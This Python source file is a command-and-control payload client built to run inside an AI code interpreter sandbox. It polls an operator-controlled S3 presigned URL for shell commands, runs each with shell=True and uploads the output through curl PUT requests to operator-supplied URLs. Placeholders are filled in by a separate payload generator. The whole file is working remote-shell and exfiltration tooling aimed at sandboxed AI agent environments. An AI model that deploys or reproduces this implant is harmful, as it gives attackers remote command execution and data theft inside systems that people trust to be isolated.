"""
S3 C2 Payload Client - runs inside AgentCore Code Interpreter sandbox.
Transport: HTTPS to s3.amazonaws.com via presigned URLs.
Command delivery:
  Operator writes {"seq": N, "cmd": "...", "response_put_url": "..."} to S3.
  Client polls S3_POLL_URL (embedded at generation time) for the object.
  Client checks seq — skips if already seen.
  Client executes cmd, uploads raw output via response_put_url.
Dependencies: curl, subprocess, json, time, os — all available in sandbox.
"""

import json
import os
import subprocess
import time

# Placeholders replaced at payload generation time by payload_generator.py
S3_POLL_URL = "__S3_POLL_URL_PLACEHOLDER__"
SESSION_ID = "__SESSION_ID_PLACEHOLDER__"

POLL_INTERVAL = int(os.environ.get("S3_POLL_INTERVAL", "5"))
LOG_FILE = "c2_s3_client.log"


def log(msg):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{time.time():.0f} {msg}\n")
    except Exception:
        pass


def curl_get(url):
    """Fetch URL content via curl. Returns body string or None on error."""
    try:
        r = subprocess.run(
            ["curl", "-s", "-f", "--max-time", "10", url],
            capture_output=True,
            text=True,
            timeout=15,
        )
        if r.returncode == 0:
            return r.stdout
    except Exception as e:
        log(f"curl_get error: {e}")
    return None


def curl_put(url, data):
    """PUT data to presigned URL via curl. Returns True on success."""
    try:
        r = subprocess.run(
            [
                "curl", "-s", "-f", "--max-time", "30",
                "-X", "PUT",
                "-H", "Content-Type: text/plain",
                "--data-binary", data,
                url,
            ],
            capture_output=True,
            text=True,
            timeout=35,
        )
        return r.returncode == 0
    except Exception as e:
        log(f"curl_put error: {e}")
    return False


def poll_command():
    """
    Fetch and parse the command object from S3.
    Returns (seq, cmd, response_put_url) or None if no command pending.
    """
    body = curl_get(S3_POLL_URL)
    if not body:
        return None
    try:
        obj = json.loads(body)
        if obj.get("cmd") is None:
            return None
        return obj.get("seq", 0), obj["cmd"], obj.get("response_put_url")
    except Exception as e:
        log(f"poll_command parse error: {e}")
    return None


def run_command(cmd):
    """Execute shell command and return stdout+stderr."""
    try:
        r = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60,
        )
        return (r.stdout + r.stderr) or "(empty)"
    except subprocess.TimeoutExpired:
        return "error: command timed out"
    except Exception as e:
        return f"error: {e}"


log(f"S3 C2 client starting. session={SESSION_ID}")

last_seq = 0

while True:
    try:
        result = poll_command()
        if result:
            seq, cmd, response_url = result
            if seq > last_seq:
                log(f"got cmd seq={seq}: {cmd[:80]}")
                out = run_command(cmd)
                log(f"output len={len(out)}")
                if response_url:
                    ok = curl_put(response_url, out)
                    log(f"output uploaded: {ok}")
                last_seq = seq
            else:
                log(f"skipping already-seen seq={seq}")
        time.sleep(POLL_INTERVAL)
    except KeyboardInterrupt:
        log("interrupted")
        break
    except Exception as e:
        log(f"loop error: {e}")
        time.sleep(POLL_INTERVAL)
